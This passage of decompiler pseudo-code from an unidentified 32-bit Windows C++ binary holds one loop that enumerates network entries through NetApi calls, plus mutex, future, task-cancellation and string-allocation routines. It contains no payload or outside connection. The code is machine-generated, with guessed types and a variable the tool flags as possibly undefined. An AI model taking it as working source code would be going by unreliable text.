                if ( (unsigned int)(v41[0] - v30 - 4) > 0x1F )
                  goto LABEL_44;
              }
              sub_44775B(v30);
            }
            LOBYTE(v59) = 2;
            v42 = 0x700000000i64;
            LOWORD(v41[0]) = 0;
            if ( HIDWORD(v40) >= 8 )
            {
              v31 = v39[0];
              if ( (unsigned int)(2 * HIDWORD(v40) + 2) >= 0x1000 )
              {
                v31 = (void *)*((_DWORD *)v39[0] - 1);
                if ( (unsigned int)(v39[0] - v31 - 4) > 0x1F )
                  goto LABEL_44;
              }
              sub_44775B(v31);
            }
            LOBYTE(v59) = 1;
            v40 = 0x700000000i64;
            LOWORD(v39[0]) = 0;
            v47 = v24 & 0xFFFFFFFD;
            if ( v38 >= 8 )
            {
              v32 = Src[0];
              if ( 2 * v38 + 2 >= 0x1000 )
              {
                v32 = (void *)*((_DWORD *)Src[0] - 1);
                if ( (unsigned int)(Src[0] - v32 - 4) > 0x1F )
                  goto LABEL_44;
              }
              sub_44775B(v32);
            }
            v13 = (char *)v53[0];
            v11 = v55;
          }
          v9 = v48 + 12;
          LOBYTE(v59) = 0;
          v48 += 12;
          if ( v11 >= 8 )
          {
            v33 = v13;
            if ( 2 * v11 + 2 >= 0x1000 )
            {
              v13 = (char *)*((_DWORD *)v13 - 1);
              if ( (unsigned int)(v33 - v13 - 4) > 0x1F )
                goto LABEL_44;
            }
            sub_44775B(v13);
            v9 = v48;
          }
          ++v46;
        }
        while ( v46 <= entriesread );
        v9 = bufptr;
        v4 = (LPWSTR)v45;
      }
      NetApiBufferFree(v9);
    }
    while ( v44 == (_DWORD *)234 );
    v6 = v58;
    v5 = HIDWORD(v57);
    v3 = v57;
    v2 = v43;
  }
  *v2 = v3;
  result = v2;
  v2[1] = v5;
  v2[2] = v6;
  return result;
}
// 49DD8C: using guessed type wchar_t asc_49DD8C[3];

//----- (004091E0) --------------------------------------------------------
void __thiscall sub_4091E0(int this, int a2, char a3)
{
  int v3; // eax
  struct _Mtx_internal_imp_t *v4; // [esp-8h] [ebp-1Ch]

  *(_BYTE *)(this + 117) = 1;
  if ( a3 )
  {
    v4 = *(struct _Mtx_internal_imp_t **)a2;
    *(_DWORD *)a2 = 0;
    *(_BYTE *)(a2 + 4) = 0;
    _Cnd_register_at_thread_exit((_Cnd_t)(this + 68), v4, (int *)(this + 112));
  }
  else
  {
    *(_DWORD *)(this + 112) = 1;
    v3 = _Cnd_broadcast((_Cnd_t)(this + 68));
    if ( v3 )
      std::_Throw_C_error(v3);
  }
}

//----- (00409270) --------------------------------------------------------
char sub_409270()
{
  return 0;
}

//----- (00409280) --------------------------------------------------------
char *__thiscall sub_409280(char *this, char a2)
{
  int v3; // eax
  int v4; // eax
  int v5; // eax
  const struct std::error_code *v7; // eax
  int v8; // [esp-8h] [ebp-38h] BYREF
  _Mtx_t *v9; // [esp-4h] [ebp-34h]
  int v10; // [esp+10h] [ebp-20h] BYREF
  _Mtx_t v11[2]; // [esp+18h] [ebp-18h] BYREF
  int v12; // [esp+2Ch] [ebp-4h]

  v11[1] = 0;
  v11[0] = (_Mtx_t)(this + 20);
  v3 = _Mtx_lock((_Mtx_t)(this + 20));
  if ( v3 )
    goto LABEL_14;
  LOBYTE(v11[1]) = 1;
  v12 = 0;
  if ( a2 && this[108] )
  {
    v7 = (const struct std::error_code *)sub_407EE0(&v10, 2);
    std::_Throw_future_error(v7);
  }
  if ( __ExceptionPtrToBool(this + 12) )
  {
    sub_405C40(&v8, this + 12);
    std::_Rethrow_future_exception(v8, v9);
  }
  this[108] = 1;
  if ( !this[118] )
  {
    v4 = *(_DWORD *)this;
    v9 = v11;
    this[118] = 1;
    (*(void (__thiscall **)(char *, _Mtx_t *))(v4 + 16))(this, v9);
  }
  if ( !*((_DWORD *)this + 28) )
  {
    while ( 1 )
    {
      v3 = sub_42F842((int)(this + 68), v11[0]);
      if ( v3 )
        break;
      if ( *((_DWORD *)this + 28) )
        goto LABEL_10;
    }
LABEL_14:
    std::_Throw_C_error(v3);
  }
LABEL_10:
  if ( __ExceptionPtrToBool(this + 12) )
  {
    sub_405C40(&v8, this + 12);
    std::_Rethrow_future_exception(v8, v9);
  }
  v12 = 1;
  if ( LOBYTE(v11[1]) )
  {
    v5 = _Mtx_unlock(v11[0]);
    if ( v5 )
      std::_Throw_C_error(v5);
  }
  return this + 8;
}
// 42F8DB: using guessed type void __stdcall __noreturn std::_Rethrow_future_exception(_DWORD, _DWORD);

//----- (004093C0) --------------------------------------------------------
int __thiscall sub_4093C0(char *this)
{
  int result; // eax
  int v3; // eax
  _Mtx_t v4[2]; // [esp+Ch] [ebp-18h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v4[1] = 0;
  v4[0] = (_Mtx_t)(this + 20);
  result = _Mtx_lock((_Mtx_t)(this + 20));
  if ( result )
    goto LABEL_10;
  LOBYTE(v4[1]) = 1;
  v5 = 0;
  if ( !this[118] )
  {
    v3 = *(_DWORD *)this;
    this[118] = 1;
    result = (*(int (__thiscall **)(char *, _Mtx_t *))(v3 + 16))(this, v4);
  }
  if ( !*((_DWORD *)this + 28) )
  {
    while ( 1 )
    {
      result = sub_42F842((int)(this + 68), v4[0]);
      if ( result )
        break;
      if ( *((_DWORD *)this + 28) )
        goto LABEL_7;
    }
LABEL_10:
    std::_Throw_C_error(result);
  }
LABEL_7:
  v5 = 1;
  if ( LOBYTE(v4[1]) )
  {
    result = _Mtx_unlock(v4[0]);
    if ( result )
      std::_Throw_C_error(result);
  }
  return result;
}

//----- (004094E0) --------------------------------------------------------
char __thiscall sub_4094E0(int this, char a2, char a3, int a4, _DWORD *a5)
{
  int v6; // edi
  int v7; // eax
  int v8; // ecx
  volatile signed __int32 *v9; // ebx
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // edi
  int v14; // ecx
  struct _Mtx_internal_imp_t *v15; // esi
  int v17[9]; // [esp+10h] [ebp-48h] BYREF
  int *v18; // [esp+34h] [ebp-24h]
  int v19; // [esp+3Ch] [ebp-1Ch]
  volatile signed __int32 *v20; // [esp+40h] [ebp-18h]
  _Mtx_t v21; // [esp+44h] [ebp-14h]
  int v22; // [esp+54h] [ebp-4h]

  v6 = 0;
  v21 = (_Mtx_t)(this + 20);
  v7 = _Mtx_lock((_Mtx_t)(this + 20));
  if ( v7 )
    std::_Throw_C_error(v7);
  v22 = 0;
  if ( a3 )
  {
    if ( *(_DWORD *)(this + 4) != 4 )
    {
      v8 = a5[1];
      if ( v8 )
      {
        _InterlockedIncrement((volatile signed __int32 *)(v8 + 4));
        v8 = a5[1];
      }
      v19 = *(_DWORD *)(this + 12);
      v9 = *(volatile signed __int32 **)(this + 16);
      *(_DWORD *)(this + 12) = *a5;
      v20 = v9;
      *(_DWORD *)(this + 16) = v8;
      if ( v9 )
      {
        if ( !_InterlockedExchangeAdd(v9 + 1, 0xFFFFFFFF) )
        {
          (**(void (__thiscall ***)(volatile signed __int32 *))v9)(v9);
          if ( !_InterlockedExchangeAdd(v9 + 2, 0xFFFFFFFF) )
            (*(void (__thiscall **)(volatile signed __int32 *))(*v9 + 4))(v9);
        }
      }
LABEL_10:
      if ( !a2 )
      {
        v11 = *(_DWORD *)(this + 4);
        *(_DWORD *)(this + 4) = 2;
        if ( v11 == 1 )
          v6 = 2;
LABEL_20:
        v22 = 2;
        v12 = _Mtx_unlock(v21);
        if ( v12 )
          std::_Throw_C_error(v12);
        v22 = -1;
        v13 = v6 - 1;
        if ( v13 )
        {
          if ( v13 == 1 && *(_DWORD *)(this + 252) )
          {
            v14 = *(_DWORD *)(this + 252);
            if ( !v14 )
              std::_Xbad_function_call();
            (*(void (__thiscall **)(int))(*(_DWORD *)v14 + 8))(v14);
            return 1;
          }
        }
        else
        {
          sub_406E10((char *)(this + 80));
          if ( *(_DWORD *)(this + 68) )
          {
            v17[0] = (int)___7___Func_impl_no_alloc_V_lambda_1___CC____CancelAndRunContinuations____Task_impl_E_details_Concurrency__UAE_N_N00ABV__shared_ptr_U_ExceptionHolder_details_Concurrency___std___Z_X__V_std__6B_;
            v17[1] = this;
            v18 = v17;
            v22 = 3;
            v15 = (struct _Mtx_internal_imp_t *)operator new(0x28u);
            v21 = v15;
            v20 = (volatile signed __int32 *)v15;
            *((_DWORD *)v15 + 9) = 0;
            LOBYTE(v22) = 5;
            if ( v18 )
              *((_DWORD *)v15 + 9) = (*(int (__thiscall **)(int *, struct _Mtx_internal_imp_t *))*v18)(v18, v15);
            LOBYTE(v22) = 3;
            sub_406EA0(v15, 16);
            if ( v18 )
              (*(void (__stdcall **)(bool))(*v18 + 16))(v18 != v17);
          }
        }
        return 1;
      }
LABEL_11:
      *(_DWORD *)(this + 4) = 4;
      v6 = 1;
      goto LABEL_20;
    }
  }
  else if ( *(_DWORD *)(this + 4) != 3 && *(_DWORD *)(this + 4) != 4 )
  {
    if ( *(_DWORD *)(this + 4) != 2 )
      goto LABEL_10;
    if ( a2 )
      goto LABEL_11;
  }
  v22 = 1;
  v10 = _Mtx_unlock(v21);
  if ( v10 )
    std::_Throw_C_error(v10);
  return 0;
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();
// 49DDCC: using guessed type int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___CC____CancelAndRunContinuations____Task_impl_E_details_Concurrency__UAE_N_N00ABV__shared_ptr_U_ExceptionHolder_details_Concurrency___std___Z_X__V_std__6B_[2])(int);

//----- (004096F0) --------------------------------------------------------
int __thiscall sub_4096F0(char **this, int a2, __int64 a3, int a4)
{
  volatile signed __int32 *v5; // esi
  int result; // eax
  char *v7; // ecx
  char *v8; // edx
  volatile signed __int32 *v9; // edi
  char *v10; // eax
  _DWORD *v11; // esi
  char *v12; // [esp+3Ch] [ebp-2Ch]
  char *v13; // [esp+40h] [ebp-28h]
  char *v14; // [esp+44h] [ebp-24h]
  char *v15; // [esp+48h] [ebp-20h]
  volatile signed __int32 *v16; // [esp+48h] [ebp-20h]

  if ( HIDWORD(a3) )
    _InterlockedIncrement((volatile signed __int32 *)(HIDWORD(a3) + 4));
  v12 = (char *)operator new(0x110u);
  *(_QWORD *)v12 = 0i64;
  *((_DWORD *)v12 + 2) = 0;
  *((_DWORD *)v12 + 1) = 1;
  *((_DWORD *)v12 + 2) = 1;
  *(_DWORD *)v12 = &std::_Ref_count_obj2<Concurrency::details::_Task_impl<unsigned char>>::`vftable';
  v15 = v12 + 16;
  if ( HIDWORD(a3) )
  {
    _InterlockedIncrement((volatile signed __int32 *)(HIDWORD(a3) + 4));
    _InterlockedIncrement((volatile signed __int32 *)(HIDWORD(a3) + 4));
  }
  sub_4073F0(v15, a2, a3, (volatile signed __int32 *)HIDWORD(a3), a4);
  *(_DWORD *)v15 = &Concurrency::details::_Task_impl<unsigned char>::`vftable';
  *((_DWORD *)v12 + 67) = 0;
  if ( HIDWORD(a3) )
  {
    if ( !_InterlockedExchangeAdd((volatile signed __int32 *)(HIDWORD(a3) + 4), 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(_DWORD))HIDWORD(a3))(HIDWORD(a3));
      if ( !_InterlockedExchangeAdd((volatile signed __int32 *)(HIDWORD(a3) + 8), 0xFFFFFFFF) )
        (*(void (__thiscall **)(_DWORD))(*(_DWORD *)HIDWORD(a3) + 4))(HIDWORD(a3));
    }
  }
  if ( HIDWORD(a3) )
  {
    if ( !_InterlockedExchangeAdd((volatile signed __int32 *)(HIDWORD(a3) + 4), 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(_DWORD))HIDWORD(a3))(HIDWORD(a3));
      if ( !_InterlockedExchangeAdd((volatile signed __int32 *)(HIDWORD(a3) + 8), 0xFFFFFFFF) )
        (*(void (__thiscall **)(_DWORD))(*(_DWORD *)HIDWORD(a3) + 4))(HIDWORD(a3));
    }
  }
  v5 = (volatile signed __int32 *)this[1];
  *this = v15;
  result = (int)v12;
  this[1] = v12;
  if ( v5 )
  {
    result = _InterlockedExchangeAdd(v5 + 1, 0xFFFFFFFF);
    if ( !result )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v5)(v5);
      result = _InterlockedExchangeAdd(v5 + 2, 0xFFFFFFFF);
      if ( !result )
        result = (*(int (__thiscall **)(volatile signed __int32 *))(*v5 + 4))(v5);
    }
  }
  if ( a2 != 2 )
  {
    v7 = 0;
    v8 = *this;
    v9 = 0;
    v13 = v8;
    v10 = this[1];
    if ( v10 )
    {
      v7 = v8;
      v9 = (volatile signed __int32 *)this[1];
      _InterlockedIncrement((volatile signed __int32 *)v10 + 2);
    }
    v14 = 0;
    v16 = 0;
    if ( v9 )
    {
      v14 = v7;
      v16 = v9;
      _InterlockedIncrement(v9 + 2);
    }
    v11 = operator new(0x74u);
    memset(v11, 0, 0x74u);
    *v11 = &Concurrency::details::_RefCounter::`vftable';
    v11[1] = 1;
    *v11 = &Concurrency::details::_CancellationTokenRegistration::`vftable';
    v11[2] = 3;
    sub_42F834(v11 + 3);
    _Mtx_init_in_situ((_Mtx_t)(v11 + 13), 2);
    *((_BYTE *)v11 + 100) = 0;
    v11[26] = 0;
    *v11 = &___7___CancellationTokenCallback_V_lambda_1___1___RegisterCancellation__Task_impl_base_details_Concurrency__QAEXV__weak_ptr_U_Task_impl_base_details_Concurrency___std___Z__details_Concurrency__6B_;
    v11[27] = 0;
    v11[28] = 0;
    if ( v16 )
    {
      v11[27] = v14;
      v11[28] = v16;
      _InterlockedIncrement(v16 + 2);
    }
    *((_DWORD *)v13 + 19) = v11;
    result = sub_406950(*((_DWORD *)v13 + 18), (int)v11);
    if ( v16 )
    {
      result = _InterlockedExchangeAdd(v16 + 2, 0xFFFFFFFF);
      if ( !result )
        result = (*(int (__thiscall **)(volatile signed __int32 *))(*v16 + 4))(v16);
    }
    if ( v9 )
    {
      result = _InterlockedExchangeAdd(v9 + 2, 0xFFFFFFFF);
      if ( !result )
        result = (*(int (__thiscall **)(volatile signed __int32 *))(*v9 + 4))(v9);
    }
  }
  if ( HIDWORD(a3) )
  {
    result = _InterlockedExchangeAdd((volatile signed __int32 *)(HIDWORD(a3) + 4), 0xFFFFFFFF);
    if ( !result )
    {
      result = (**(int (__thiscall ***)(_DWORD))HIDWORD(a3))(HIDWORD(a3));
      if ( !_InterlockedDecrement((volatile signed __int32 *)(HIDWORD(a3) + 8)) )
        return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)HIDWORD(a3) + 4))(HIDWORD(a3));
    }
  }
  return result;
}
// 42F834: using guessed type _DWORD __cdecl sub_42F834(_DWORD);
// 493C9C: using guessed type void *Concurrency::details::_RefCounter::`vftable';
// 493CA8: using guessed type void *Concurrency::details::_CancellationTokenRegistration::`vftable';
// 49DDBC: using guessed type int (__thiscall *___7___CancellationTokenCallback_V_lambda_1___1___RegisterCancellation__Task_impl_base_details_Concurrency__QAEXV__weak_ptr_U_Task_impl_base_details_Concurrency___std___Z__details_Concurrency__6B_)(void *Block, char);
// 49DE48: using guessed type void *std::_Ref_count_obj2<Concurrency::details::_Task_impl<unsigned char>>::`vftable';
// 49DE90: using guessed type void *Concurrency::details::_Task_impl<unsigned char>::`vftable';

//----- (004099E0) --------------------------------------------------------
int __thiscall sub_4099E0(_DWORD *this)
{
  int result; // eax
  int v3; // ecx
  volatile signed __int32 *v4; // esi
  signed __int32 v5; // edx
  volatile signed __int32 *v6; // esi

  result = this[28];
  v3 = 0;
  v4 = 0;
  if ( result )
  {
    v5 = *(_DWORD *)(result + 4);
    v6 = (volatile signed __int32 *)(result + 4);
    if ( v5 )
    {
      while ( 1 )
      {
        result = _InterlockedCompareExchange(v6, v5 + 1, v5);
        if ( result == v5 )
          break;
        v5 = result;
        if ( !result )
          goto LABEL_5;
      }
      v3 = this[27];
      v4 = (volatile signed __int32 *)this[28];
    }
    else
    {
LABEL_5:
      v4 = 0;
      v3 = 0;
    }
  }
  if ( v3 )
    result = (*(int (__stdcall **)(_DWORD, _DWORD, _DWORD, int))(*(_DWORD *)v3 + 4))(0, 0, 0, v3 + 12);
  if ( v4 )
  {
    result = _InterlockedExchangeAdd(v4 + 1, 0xFFFFFFFF);
    if ( !result )
    {
      result = (**(int (__thiscall ***)(volatile signed __int32 *))v4)(v4);
      if ( !_InterlockedDecrement(v4 + 2) )
        return (*(int (__thiscall **)(volatile signed __int32 *))(*v4 + 4))(v4);
    }
  }
  return result;
}

//----- (00409AC0) --------------------------------------------------------
int __thiscall sub_409AC0(_DWORD *this)
{
  int v1; // ecx

  v1 = this[9];
  if ( !v1 )
    std::_Xbad_function_call();
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 8))(v1);
}

//----- (00409AE0) --------------------------------------------------------
void __thiscall sub_409AE0(Concurrency::details **this)
{
  Concurrency::details *v1; // esi
  struct Concurrency::details::_Threadpool_chore *v2; // [esp+0h] [ebp-14h]

  v1 = *this;
  if ( *this )
  {
    Concurrency::details::_Release_chore(*this, v2);
    sub_44775B(v1);
  }
}
// 409B11: variable 'v2' is possibly undefined

//----- (00409B40) --------------------------------------------------------
int __thiscall sub_409B40(void *this)
{
  return *(_DWORD *)this;
}

//----- (00409B50) --------------------------------------------------------
int __thiscall sub_409B50(_Mtx_t *this)
{
  int result; // eax

  result = _Mtx_unlock(*this);
  if ( result )
    std::_Throw_C_error(result);
  return result;
}

//----- (00409BA0) --------------------------------------------------------
void __thiscall sub_409BA0(int this)
{
  int v1; // eax

  if ( *(_BYTE *)(this + 4) )
  {
    v1 = _Mtx_unlock(*(_Mtx_t *)this);
    if ( v1 )
      std::_Throw_C_error(v1);
  }
}

//----- (00409BF0) --------------------------------------------------------
_BYTE *__thiscall sub_409BF0(_BYTE *this, _Mtx_t a2)
{
  int v3; // eax

  *(_DWORD *)this = a2;
  this[4] = 0;
  v3 = _Mtx_lock(a2);
  if ( v3 )
    std::_Throw_C_error(v3);
  this[4] = 1;
  return this;
}

//----- (00409C20) --------------------------------------------------------
_DWORD *__thiscall sub_409C20(_DWORD *this, void *a2)
{
  *(_WORD *)this = 0;
  this[4] = 0;
  this[5] = 7;
  sub_404330(this, a2, wcslen((const unsigned __int16 *)a2));
  return this;
}

//----- (00409C70) --------------------------------------------------------
void **__thiscall sub_409C70(void **Src, _DWORD *Srca)
{
  _DWORD *v3; // ecx
  unsigned int v4; // edi
  unsigned int v5; // edx
  _BYTE *v6; // ebx
  void *v7; // eax
  void **result; // eax
  void *Srcb; // [esp+14h] [ebp+8h]

  v3 = Srca;
  v4 = Srca[4];
  if ( Srca[5] >= 0x10u )
    v3 = (_DWORD *)*Srca;
  v5 = (unsigned int)Src[5];
  v6 = Src[4];
  if ( v4 > v5 - (unsigned int)v6 )
    return sub_40AD00(Src, v4, (int)Srca, v3, Srca[4]);
  Srcb = Src;
  Src[4] = &v6[v4];
  v7 = Src;
  if ( v5 >= 0x10 )
  {
    v7 = *Src;
    Srcb = *Src;
  }
  memmove_0(&v6[(_DWORD)v7], v3, v4);
  result = Src;
  v6[(_DWORD)Srcb + v4] = 0;
  return result;
}

//----- (00409CE0) --------------------------------------------------------
void __thiscall sub_409CE0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax

  v2 = this[5];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)*this;
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  this[4] = 0;
  this[5] = 15;
  *(_BYTE *)this = 0;
}

//----- (00409D30) --------------------------------------------------------
_DWORD *__thiscall sub_409D30(_DWORD *this, int a2)
{
  this[4] = 0;
  this[5] = 0;
  *(_OWORD *)this = *(_OWORD *)a2;
  *((_QWORD *)this + 2) = *(_QWORD *)(a2 + 16);
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
  return this;
}

//----- (00409D70) --------------------------------------------------------
void **__thiscall sub_409D70(void **this, void *a2)
{
  this[4] = 0;
  this[5] = (void *)15;
  *(_BYTE *)this = 0;
  sub_40A390(this, a2, strlen((const char *)a2));
  return this;
}

//----- (00409DB0) --------------------------------------------------------
_DWORD *__thiscall sub_409DB0(_DWORD *this, _DWORD *Src)
{
  _DWORD *v3; // edi
  bool v4; // cf
  unsigned int v5; // eax
  _DWORD *result; // eax
  int v7; // ebx
  void *v8; // eax
  _DWORD *v9; // ecx
  void *Srca; // [esp+14h] [ebp+8h]

  v3 = Src;
  this[4] = 0;
  this[5] = 0;
  v4 = Src[5] < 0x10u;
  v5 = Src[4];
  Srca = (void *)v5;
  if ( !v4 )
    v3 = (_DWORD *)*v3;
  if ( v5 >= 0x10 )
  {
    v7 = v5 | 0xF;
    if ( (v5 | 0xF) > 0x7FFFFFFF )
      v7 = 0x7FFFFFFF;
    if ( (unsigned int)(v7 + 1) < 0x1000 )
    {
      if ( v7 == -1 )
        v9 = 0;
      else
        v9 = operator new(v7 + 1);
    }
    else
    {
      if ( v7 + 36 <= (unsigned int)(v7 + 1) )
        sub_403CC0();
      v8 = operator new(v7 + 36);
      if ( !v8 )
        _invalid_parameter_noinfo_noreturn();
      v9 = (_DWORD *)(((unsigned int)v8 + 35) & 0xFFFFFFE0);
      *(v9 - 1) = v8;
    }
    *this = v9;
    memmove(v9, v3, (size_t)Srca + 1);
    this[4] = Srca;
    result = this;
    this[5] = v7;
  }
  else
  {
    *(_OWORD *)this = *(_OWORD *)v3;
    this[4] = v5;
    result = this;
    this[5] = 15;
  }
  return result;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);

//----- (00409E70) --------------------------------------------------------
char *__thiscall sub_409E70(char *Block, char a2)
{
  bool v3; // zf

  v3 = Block[117] == 0;
  *(_DWORD *)Block = &std::_Associated_state<int>::`vftable';
  if ( !v3 && !*((_DWORD *)Block + 28) )
    _Cnd_unregister_at_thread_exit((_Mtx_t)(Block + 20));
  _Cnd_destroy_in_situ((_Cnd_t)(Block + 68));
  _Mtx_destroy_in_situ((_Mtx_t)(Block + 20));
  __ExceptionPtrDestroy(Block + 12);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 49DE10: using guessed type void *std::_Associated_state<int>::`vftable';

//----- (00409ED0) --------------------------------------------------------
char *__thiscall sub_409ED0(char *Block, char a2)
{
  int v3; // eax
  volatile signed __int32 *v4; // ecx
  char *v5; // ecx

  v3 = *((_DWORD *)Block + 19);
  *(_DWORD *)Block = &Concurrency::details::_Task_impl<unsigned char>::`vftable';
  if ( v3 )
  {
    sub_406AD0(*((_DWORD *)Block + 18), v3);
    v4 = (volatile signed __int32 *)*((_DWORD *)Block + 19);
    if ( !_InterlockedDecrement(v4 + 1) )
      (*(void (__thiscall **)(volatile signed __int32 *))(*v4 + 4))(v4);
    *((_DWORD *)Block + 19) = 0;
  }
  v5 = (char *)*((_DWORD *)Block + 63);
  if ( v5 )
  {
    (*(void (__stdcall **)(bool))(*(_DWORD *)v5 + 16))(v5 != Block + 216);
    *((_DWORD *)Block + 63) = 0;
  }
  sub_407540(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 49DE90: using guessed type void *Concurrency::details::_Task_impl<unsigned char>::`vftable';

//----- (00409F90) --------------------------------------------------------
char *__thiscall sub_409F90(char *Block, char a2)
{
  volatile signed __int32 *v3; // ecx

  v3 = (volatile signed __int32 *)*((_DWORD *)Block + 28);
  if ( v3 && !_InterlockedExchangeAdd(v3 + 2, 0xFFFFFFFF) )
    (*(void (__thiscall **)(volatile signed __int32 *))(*v3 + 4))(v3);
  *(_DWORD *)Block = &Concurrency::details::_CancellationTokenRegistration::`vftable';
  _Mtx_destroy_in_situ((_Mtx_t)(Block + 52));
  _Cnd_destroy_in_situ((_Cnd_t)(Block + 12));
  *(_DWORD *)Block = &Concurrency::details::_RefCounter::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493C9C: using guessed type void *Concurrency::details::_RefCounter::`vftable';
// 493CA8: using guessed type void *Concurrency::details::_CancellationTokenRegistration::`vftable';

//----- (00409FF0) --------------------------------------------------------
void __thiscall sub_409FF0(char *this, char a2, int a3, int a4)
{
  int v5; // eax
  int v6; // eax
  const struct std::error_code *v7; // eax
  int v8; // [esp+8h] [ebp-28h] BYREF
  char Block[8]; // [esp+10h] [ebp-20h] BYREF
  _Mtx_t v10[2]; // [esp+18h] [ebp-18h] BYREF
  int v11; // [esp+2Ch] [ebp-4h]

  v11 = 0;
  v10[1] = 0;
  v10[0] = (_Mtx_t)(this + 20);
  v5 = _Mtx_lock((_Mtx_t)(this + 20));
  if ( v5 )
    std::_Throw_C_error(v5);
  LOBYTE(v10[1]) = 1;
  __ExceptionPtrCopy(Block, &a2);
  LOBYTE(v11) = 2;
  if ( this[117] )
  {
    v7 = (const struct std::error_code *)sub_407EE0(&v8, 3);
    std::_Throw_future_error(v7);
  }
  sub_42EF7B((int)(this + 12), (int)Block);
  (*(void (__thiscall **)(char *, _Mtx_t *, int))(*(_DWORD *)this + 20))(this, v10, a4);
  __ExceptionPtrDestroy(Block);
  LOBYTE(v11) = 3;
  if ( LOBYTE(v10[1]) )
  {
    v6 = _Mtx_unlock(v10[0]);
    if ( v6 )
      std::_Throw_C_error(v6);
  }
  __ExceptionPtrDestroy(&a2);
}

//----- (0040A0F0) --------------------------------------------------------
int __thiscall sub_40A0F0(int this, char a2)
{
  struct _Mtx_internal_imp_t *v3; // esi
  int v4; // eax
  int result; // eax
  int v6; // eax
  int v7; // esi

  v3 = (struct _Mtx_internal_imp_t *)(this + 20);
  *(_BYTE *)(this + 208) = a2;
  v4 = _Mtx_lock((_Mtx_t)(this + 20));
  if ( v4 )
    std::_Throw_C_error(v4);
  if ( *(_DWORD *)(this + 4) == 4 )
  {
    result = _Mtx_unlock(v3);
    if ( result )
      std::_Throw_C_error(result);
  }
  else
  {
    *(_DWORD *)(this + 4) = 3;
    v6 = _Mtx_unlock(v3);
    if ( v6 )
      std::_Throw_C_error(v6);
    sub_406E10((char *)(this + 80));
    result = *(_DWORD *)(this + 68);
    *(_DWORD *)(this + 68) = 0;
    if ( result )
    {
      do
      {
        v7 = *(_DWORD *)(result + 4);
        sub_4079B0((_DWORD *)this, result);
        result = v7;
      }
      while ( v7 );
    }
  }
  return result;
}

//----- (0040A1C0) --------------------------------------------------------
char *__thiscall sub_40A1C0(unsigned int *this, unsigned int a2)
{
  size_t v3; // esi
  void *v4; // eax
  void *v5; // ecx
  unsigned int v6; // eax
  char *result; // eax
  char *v8; // eax

  if ( a2 > 0x3FFFFFFF )
    goto LABEL_9;
  v3 = 4 * a2;
  if ( 4 * a2 < 0x1000 )
  {
    if ( v3 )
    {
      v8 = (char *)operator new(v3);
      *this = (unsigned int)v8;
      this[1] = (unsigned int)v8;
      result = &v8[v3];
      this[2] = (unsigned int)result;
    }
    else
    {
      *this = 0;
      this[1] = 0;
      result = 0;
      this[2] = 0;
    }
    return result;
  }
  if ( v3 + 35 <= v3 )
LABEL_9:
    sub_403CC0();
  v4 = operator new(v3 + 35);
  v5 = v4;
  if ( !v4 )
    _invalid_parameter_noinfo_noreturn();
  v6 = ((unsigned int)v4 + 35) & 0xFFFFFFE0;
  *(_DWORD *)(v6 - 4) = v5;
  *this = v6;
  this[1] = v6;
  result = (char *)(v3 + v6);
  this[2] = (unsigned int)result;
  return result;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);

//----- (0040A250) --------------------------------------------------------
void **__thiscall sub_40A250(void **this, size_t Size, char a3)
{
  unsigned int v4; // ecx
  void *v5; // ebx
  size_t v7; // ebx
  unsigned int v8; // edx
  unsigned int v9; // ecx
  void *v10; // eax
  _DWORD *v11; // ecx
  void *v12; // eax
  unsigned int v13; // [esp+Ch] [ebp-Ch]
  _DWORD *v14; // [esp+10h] [ebp-8h]

  v4 = (unsigned int)this[5];
  v13 = v4;
  if ( Size > v4 )
  {
    if ( Size > 0x7FFFFFFF )
      sub_404900();
    v7 = Size | 0xF;
    if ( (Size | 0xF) <= 0x7FFFFFFF )
    {
      v8 = v4 >> 1;
      if ( v4 <= 0x7FFFFFFF - (v4 >> 1) )
      {
        if ( v7 < v8 + v4 )
          v7 = v8 + v4;
      }
      else
      {
        v7 = 0x7FFFFFFF;
      }
    }
    else
    {
      v7 = 0x7FFFFFFF;
    }
    v9 = __CFADD__(v7, 1) ? -1 : v7 + 1;
    if ( v9 < 0x1000 )
    {
      if ( v9 )
        v11 = operator new(__CFADD__(v7, 1) ? -1 : v7 + 1);
      else
        v11 = 0;
    }
    else
    {
      if ( v9 + 35 <= v9 )
        sub_403CC0();
      v10 = operator new(v9 + 35);
      if ( !v10 )
        goto LABEL_25;
      v11 = (_DWORD *)(((unsigned int)v10 + 35) & 0xFFFFFFE0);
      *(v11 - 1) = v10;
    }
    v14 = v11;
    this[4] = (void *)Size;
    this[5] = (void *)v7;
    memset(v11, a3, Size);
    *((_BYTE *)v14 + Size) = 0;
    if ( v13 < 0x10 )
    {
LABEL_24:
      *this = v14;
      return this;
    }
    v12 = *this;
    if ( v13 + 1 < 0x1000 )
    {
LABEL_23:
      sub_44775B(v12);
      goto LABEL_24;
    }
    if ( (unsigned int)v12 - *((_DWORD *)v12 - 1) - 4 <= 0x1F )
    {
      v12 = (void *)*((_DWORD *)v12 - 1);
      goto LABEL_23;
    }
LABEL_25:
    _invalid_parameter_noinfo_noreturn();
  }
  v5 = this;
  if ( v4 >= 0x10 )
    v5 = *this;
  this[4] = (void *)Size;
  memset(v5, a3, Size);
  *((_BYTE *)v5 + Size) = 0;
  return this;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);
// 404900: using guessed type void __noreturn sub_404900(void);

